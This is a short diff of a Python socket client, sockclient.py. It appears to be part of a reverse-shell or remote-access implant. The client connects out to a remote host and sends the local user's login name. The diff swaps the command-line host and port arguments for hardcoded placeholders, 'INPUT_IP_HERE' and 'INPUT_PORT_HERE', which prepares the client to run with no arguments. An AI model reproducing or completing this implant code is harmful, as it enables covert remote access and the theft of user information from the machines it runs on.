@@ -5,9 +5,9 @@ import os
 import sys
 
 
-def session_handler(host_ip, host_port):
+def session_handler():
     print(f'[+] Connecting to {host_ip}')
-    sock.connect((host_ip, host_port))
+    sock.connect((host_ip, int(host_port)))
 
     # send user information
     outbound(os.getlogin())
@@ -66,9 +66,9 @@ def outbound(message):
 if __name__ == '__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        host_ip = sys.argv[1]
-        host_port = int(sys.argv[2])
-        session_handler(host_ip, host_port)
+        host_ip = 'INPUT_IP_HERE'
+        host_port = 'INPUT_PORT_HERE'
+        session_handler()
     except IndexError:
         print('[-] Command line argument(s) missing. Please try again')
         print('[-] Usage: python sockclient.py [host IP] [host Port]')
